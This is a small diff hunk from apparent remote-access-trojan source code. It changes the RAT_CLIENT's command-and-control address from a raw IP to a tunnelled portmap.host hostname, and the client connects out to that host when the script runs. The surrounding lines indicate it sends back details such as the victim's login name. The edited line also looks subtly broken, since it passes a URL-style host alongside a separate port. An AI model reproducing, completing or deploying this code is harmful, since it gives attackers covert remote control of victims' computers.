@@ -603,7 +603,7 @@ User: {os.getlogin()}
                 s.send(b"exit")
                 break
 
-rat = RAT_CLIENT('213.181.157.141', 8081)
+rat = RAT_CLIENT('tcp://DaddyJet123-55929.portmap.host:55929', 55929)
 
 if __name__ == '__main__':
     rat.build_connection()
